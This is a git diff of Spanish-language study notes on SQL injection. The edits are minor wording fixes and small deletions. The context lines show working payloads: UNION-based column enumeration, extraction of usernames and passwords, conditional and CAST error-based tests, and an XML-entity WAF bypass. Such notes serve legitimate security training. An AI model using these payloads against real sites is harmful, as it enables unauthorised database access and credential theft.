@@ -1,5 +1,3 @@
-POR FAVOR si es un número NO le pongas comilla coño
-
 ORDERBY-> si hace:
 
 ```
@@ -26,7 +24,7 @@ Ojo con oracle si la consulta tiene 3 columnas no te vale con usar `'UNION SELEC
 ```
 'UNION SELECT NULL,NULL,NULL FROM DUAL -- -
 ```
-Si solo hay una columna que podamos ver entonces podemos hacer que en esa misma columna se enseñen mas de un dato concatentando datos de esta forma (en Oracle, en otras db hay otras formas):
+Si solo hay una columna que podamos ver entonces podemos hacer que en esa misma columna se enseñen más de un dato concatentando datos de esta forma (en Oracle, en otras db hay otras formas):
 
 `' UNION SELECT username || '~' || password FROM users--`
 Enumeración de oracle:
@@ -115,7 +113,6 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 cuando lo de dentro del WHEN es true entonces se ejecuta el THEN cuando es false entonces se ejecuta el ELSE
 
 En la primera inyección se ejecutará el ELSE puesto que 1 no es igual a 2, entonces en la respuesta no saldra nada
-`OM Users)=`
 En la segunda inyección se ejecutará el THEN dando como resultado un erro puesto que no se puede dividir 1 entre 0
 
 Aplicado a un caso más practico:
@@ -145,18 +142,12 @@ este `CAST` lo que hace es convertir el output de la query a int, partiendo de l
 
 `ERROR: invalid input syntax for type integer: "Example data"`
 
-tambien puedes hacer query baásica por si lo demás no funciona para ver si te da mas info : 
+también puedes hacer query básica por si lo demás no funciona para ver si te da mas info : 
 
 
 `' AND CAST((SELECT 1) AS int)--`
 
 ### Time based
-
-
-Siempre se da por hecho:
-
-tabla : users
-columnas: username , password
 
 
 La idea es hacer una query y ver una diferencia en el tiempo de respuesta de cuando es true y cuando es false
@@ -199,7 +190,7 @@ esto lo que hace es leer la contraseña del admin con : `SELECT password FROM us
 
 ### SQL injection in different contexts
 
-tambien se pueden ejecutar en APIS que envian la info en XML por ejemplo donde para bypassear un waf podríamos encodear la S de SELECT en xml para que se vea así:
+también se pueden ejecutar en APIs que envían la info en XML por ejemplo donde para bypassear un waf podríamos encodear la S de SELECT en html para que se vea así:
 
 ```
 <stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
